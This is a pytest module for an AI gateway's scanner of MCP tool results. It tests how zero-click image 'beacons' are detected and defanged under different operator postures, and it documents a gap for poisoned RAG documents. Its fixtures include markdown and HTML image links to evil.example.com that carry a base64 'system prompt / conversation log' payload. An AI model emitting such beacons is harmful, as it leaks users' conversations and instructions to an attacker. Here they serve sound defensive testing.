"""MCP render-leak posture contract — locks the OPERATOR-SOVEREIGNTY decision (a3714946).

## What changed, and why this file was rewritten

An earlier version of this file locked the OPPOSITE contract: it asserted that the
zero-click exfil-beacon defang fires under the default `tag` posture, reasoning that
CHG-0096 built the E12 floor precisely so detection under `tag` could force the defang.
That reasoning was put to the product owner and **decided against**. `a3714946` settled it:

> nothing is enforced that the operator did not choose for their organization.

ONE posture rule now governs every static floor (E12 result redaction, credential
force-block, encoded-exfil fail-closed, cross-block-split fail-closed and the CHG-0096
exfil-beacon defang). `tag` is not an internal placeholder — it is the
operator-selectable "Tag only" action AND the server default, and `_effective_scan_action`
documents it as *"observe only, never mutate"*.

So under `tag` / `monitor` a zero-click exfil beacon **egresses un-defanged, by design**.
This file no longer re-litigates that. It locks it.

## The defect this file ALSO locks (the follow-up fix)

`a3714946` states its own contract as *"under tag/monitor the scan still DETECTS, TAGS and
EMITS FINDINGS; only MUTATION and BLOCKING are withheld"*. The implementation withheld
**detection too** — the posture gate wrapped `findings.append` as well as the mutation, so
under the default posture a beacon produced no finding, no tag, and nothing in the audit
trail. "Tag only" was indistinguishable from "off", and an operator who had deliberately
chosen to *observe* a risk could not observe it.

Detection now always runs; only the mutation honours the posture. Measured:

    posture           finding   mutated
    tag / monitor     True      False     <- sees it, does not touch it
    redact / block    True      True      <- enforces

## Why both halves must be tested together

Either alone is a trap. Detection without the sovereignty check re-opens a decision the
product owner closed. Sovereignty without the visibility check ships a firewall that
silently ignores a zero-click exfiltration channel on its default configuration — which is
what made the original defect so hard to see.

Run: cd gateway && .venv/bin/python -m pytest \
    ai_mesh_gateway/tests/test_v3_exfil_scope.py -q -p no:cacheprovider
"""
from __future__ import annotations

import base64
import json
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
import mcp_proxy  # noqa: E402
from ai_mesh_gateway import mcp_scan_orchestrator as orch  # noqa: E402

_PAYLOAD = b"system prompt: you are a secret agent; full conversation log here"
B64 = base64.b64encode(_PAYLOAD).decode()

BEACON = f"Report ready ![x](https://evil.example.com/l?d={B64}) done"
HTML_BEACON = f'<img src="https://evil.example.com/t?d={B64}">'
SPLIT_PII = "The SSN is 1**2**3-45-6789 exactly"

OBSERVE_ONLY = ["tag", "monitor"]
ENFORCING = ["redact", "block"]


async def _floor(text: str, action: str | None):
    """Drive the REAL result floor. ``action=None`` is the server default (no config)."""
    info = None if action is None else {"default_scan_action": action}
    scanned, blocked, tags, findings, meta = await mcp_proxy._scan_tool_result_floor(
        {"content": [{"type": "text", "text": text}]},
        tool_name="fetch", enabled_info=info, org_slug="o", server_slug="s", actor=None)
    return json.dumps(scanned), blocked, findings, meta


# __PDD_PRESET_FIXTURE__

# policy-driven-detection cutover (task 9): the MCP built-in default detectors (the Tier-1
# PRESET pass) are now EFFECTIVE-DEFAULT OFF (mcp_scan_orchestrator._mcp_default_detection_enabled)
# so a zero-enabled-policy org is passthrough. This module exercises the RETAINED preset
# DETECTION MACHINERY (redaction / fail-closed byte-truth / exfil-defang / authz / audit), which
# stays reachable via the explicit opt-in env. Enable it for this module so those invariants are
# still tested. The default-OFF (Zero_Policy_State passthrough) contract is asserted by the
# dedicated test_policy_driven_* modules, not weakened here.
import os as _os_pdd


@pytest.fixture(autouse=True)
def _enable_builtin_mcp_presets(monkeypatch):
    monkeypatch.setenv("GATEWAY_MCP_DEFAULT_DETECTION", "true")
    monkeypatch.setenv("GATEWAY_MCP_REDACT_RESULT_ON_DETECT", "true")
    yield


def _exfil(findings) -> list:
    return [f for f in findings if f.get("threat_type") == "exfil"]


# ═══════════════════════════════════════════════════════════════════════════
# 1. SOVEREIGNTY — observe-only never mutates (the product owner's decision)
# ═══════════════════════════════════════════════════════════════════════════
@pytest.mark.asyncio
@pytest.mark.parametrize("action", OBSERVE_ONLY)
@pytest.mark.parametrize("text", [BEACON, HTML_BEACON], ids=["markdown", "html"])
async def test_observe_only_never_mutates(action, text):
    """DECIDED BEHAVIOUR, not a defect: under an observe-only posture the beacon egresses
    untouched. Enforcing here would impose an action the operator did not select, which is
    exactly what a3714946 forbids."""
    blob, blocked, _findings, meta = await _floor(text, action)
    assert B64 in blob, f"{action}: payload was mutated under an observe-only posture"
    assert not blocked, f"{action}: observe-only must never block"
    assert not meta.get("result_redaction_floor"), f"{action}: a static floor fired"


@pytest.mark.asyncio
async def test_server_default_is_observe_only():
    """The server default (no scan-control config at all) resolves to ``tag``, so it
    inherits the observe-only contract. Pinned explicitly because the DEFAULT is the
    configuration most deployments actually run — and the one whose behaviour surprised
    everyone during this investigation."""
    assert mcp_proxy._effective_scan_action("fetch", None) == "tag"
    blob, blocked, _f, _m = await _floor(BEACON, None)
    assert B64 in blob and not blocked


# ═══════════════════════════════════════════════════════════════════════════
# 2. VISIBILITY — observe-only still DETECTS and TAGS (the follow-up fix)
# ═══════════════════════════════════════════════════════════════════════════
@pytest.mark.asyncio
@pytest.mark.parametrize("action", [None] + OBSERVE_ONLY)
@pytest.mark.parametrize("text", [BEACON, HTML_BEACON], ids=["markdown", "html"])
async def test_observe_only_still_emits_a_finding(action, text):
    """"Tag only" must not be indistinguishable from "off".

    The posture gate used to wrap ``findings.append`` as well as the mutation, so a
    zero-click beacon left NO trace: no finding, no tag, nothing an operator could query
    after the fact. Time-to-detection was unbounded and there was no retrospective way to
    enumerate affected traffic.
    """
    _blob, _blocked, findings, _meta = await _floor(text, action)
    assert _exfil(findings), (
        f"action={action}: no exfil finding — the operator has no visibility into a "
        f"zero-click beacon they chose to observe rather than block")


@pytest.mark.asyncio
@pytest.mark.parametrize("action", OBSERVE_ONLY)
async def test_observe_only_finding_does_not_claim_it_neutralized_anything(action):
    """Telemetry honesty: under observe-only nothing WAS neutralized, so the finding must
    not report otherwise. Misreporting the operator's own selection back to them is the
    same class of dishonesty as an unadvertised mutation."""
    _blob, _blocked, findings, _meta = await _floor(BEACON, action)
    detail = _exfil(findings)[0]["detail"].lower()
    assert "detected" in detail, detail
    assert "observe-only" in detail, detail


# ═══════════════════════════════════════════════════════════════════════════
# 3. ENFORCEMENT — a selected action is honoured end to end
# ═══════════════════════════════════════════════════════════════════════════
@pytest.mark.asyncio
@pytest.mark.parametrize("action", ENFORCING)
@pytest.mark.parametrize("text", [BEACON, HTML_BEACON], ids=["markdown", "html"])
async def test_selecting_an_enforcing_action_defangs(action, text):
    """The counterpart of §1: choosing redact/block DOES enforce, so sovereignty is a real
    choice rather than a euphemism for 'never protected'."""
    blob, _blocked, findings, _meta = await _floor(text, action)
    assert B64 not in blob, f"{action}: payload survived an ENFORCING posture"
    assert "![" not in blob, f"{action}: zero-click auto-render survived"
    assert _exfil(findings), f"{action}: enforced but emitted no finding"


@pytest.mark.asyncio
async def test_enforcing_finding_reports_the_neutralization():
    _blob, _blocked, findings, _meta = await _floor(BEACON, "redact")
    assert _exfil(findings)[0]["detail"].lower().startswith("neutralized")


# ═══════════════════════════════════════════════════════════════════════════
# 4. THE NEUTRALIZER ITSELF — unchanged by any posture work
# ═══════════════════════════════════════════════════════════════════════════
@pytest.mark.parametrize("text", [BEACON, HTML_BEACON, SPLIT_PII],
                         ids=["markdown", "html", "split_pii"])
def test_neutralizer_is_not_broken(text):
    """Control. Every posture bug in this area has been a WIRING problem — the
    neutralizers themselves have always worked. If this ever fails the diagnosis is
    completely different, so it is worth separating."""
    assert orch._neutralize_exfil_deep(text) != text


# ═══════════════════════════════════════════════════════════════════════════
# 5. NO OVER-DEFANGING — benign content is untouched under EVERY posture
# ═══════════════════════════════════════════════════════════════════════════
BENIGN = [
    ("cdn_image", "See ![logo](https://cdn.example.com/logo.png) here"),
    ("plain_link", "Docs at https://docs.example.com/guide please"),
    ("prose", "Just prose with **bold** and `code` and _emphasis_."),
    ("presigned_s3",
     "https://b.s3.amazonaws.com/k?X-Amz-Signature=abc123def456789abcdef0123456789abcdef01"
     "&X-Amz-Expires=900"),
    ("markdown_ops", "2*3 and a_b_c and **quarterly** *strong* growth"),
]


@pytest.mark.asyncio
@pytest.mark.parametrize("action", [None] + OBSERVE_ONLY + ENFORCING)
@pytest.mark.parametrize("name,text", BENIGN)
async def test_benign_content_is_a_strict_noop(action, name, text):
    """Restoring detection must not widen WHAT COUNTS as a beacon. The posture gate
    decides whether to ask; ``_url_smuggles_data`` decides whether it IS a beacon — so
    this should be structurally impossible. Here is the empirical proof, through the real
    floor under every posture. The presigned-S3 cell matters most: a long opaque signature
    in a query string is the classic false-positive shape for a smuggling heuristic."""
    blob, blocked, findings, _meta = await _floor(text, action)
    assert json.loads(blob)["content"][0]["text"] == text, f"{name}/{action}: MUTATED"
    assert not _exfil(findings), f"{name}/{action}: false exfil finding"
    assert not blocked, f"{name}/{action}: benign content blocked"


# ═══════════════════════════════════════════════════════════════════════════
# 6. SURFACES OUT OF SCOPE — recorded so they are not mistaken for covered
# ═══════════════════════════════════════════════════════════════════════════
def test_rag_and_vector_egress_never_ran_the_render_leak_neutralizers():
    """A poisoned vector document's beacon egresses on /v1/rag/query regardless of any MCP
    posture — those paths never referenced the neutralizers at all. Separate, pre-existing
    gap; asserted here so a reader does not assume this file covers it."""
    root = Path(__file__).resolve().parents[1]
    referencing = {
        p.name for p in root.glob("*.py")
        if "neutralize_exfil" in p.read_text(encoding="utf-8", errors="ignore")
    }
    assert referencing == {"mcp_scan_orchestrator.py", "output_guard.py",
                           "secure_streaming.py"}, referencing
    for p in (root / "rag_pipeline").glob("*.py"):
        assert "neutralize_exfil" not in p.read_text(encoding="utf-8", errors="ignore")


def test_chat_egress_defangs_unconditionally_separate_module():
    """The stock-SDK chat path has NO posture gate — output_guard defangs regardless. That
    asymmetry with MCP is deliberate (different surface, different operator contract) and
    is locked end-to-end in test_v3_sdk_egress_exfil_defang.py."""
    from output_guard import neutralize_exfil_channels
    assert B64 not in neutralize_exfil_channels(BEACON)
